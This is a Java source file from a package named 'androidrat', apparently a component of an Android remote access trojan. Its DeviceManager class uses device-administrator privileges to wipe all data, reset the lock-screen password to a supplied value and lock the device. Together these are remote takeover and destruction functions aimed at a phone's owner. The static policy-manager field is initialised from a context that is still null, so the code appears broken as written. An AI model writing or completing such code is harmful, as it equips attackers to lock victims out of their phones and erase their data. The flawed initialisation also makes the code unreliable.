package com.ot.androidrat;

import android.annotation.SuppressLint;
import android.app.Application;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;

public class DeviceManager {

    @SuppressLint("StaticFieldLeak")
    static Context context;
    static ComponentName componentName;
    static DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    DeviceManager(Context context, ComponentName componentName){
        DeviceManager.context = context;
        DeviceManager.componentName = componentName;
    }

    public void wipeDevice(){
        if (isAdminActive()) {
            dpm.wipeData(0);
        }
    }

    public void resetPassword(String newPassword){
        dpm.resetPassword(newPassword, 0);
    }

    public void lockDevice(){
        dpm.lockNow();
    }

    private boolean isAdminActive(){
        return dpm.isAdminActive(componentName);
    }
}
